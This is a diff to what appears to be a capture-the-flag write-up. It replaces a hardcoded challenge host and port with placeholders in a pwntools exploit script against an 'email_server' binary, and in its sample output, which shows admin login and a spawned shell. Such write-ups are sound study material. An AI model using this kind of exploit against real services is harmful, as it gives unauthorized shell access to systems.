@@ -125,7 +125,10 @@ This ensures:
 from pwn import *
 
 # Local: p = process('./email_server')
-p = remote("challenge.host", 31337)
+
+HOST = ""
+PORT = ""
+p = remote(HOST, PORT) 
 
 K = 32
 admin_pass = bytes([
@@ -155,7 +158,7 @@ p.interactive()
 ## Output
 
 ```
-[+] Opening connection to challenge.host on port 31337: Done
+[+] Opening connection to HOST on port PORT: Done
 -> Password correct. Access granted.
 -> Admin login successful. Opening shell...
 $ whoami
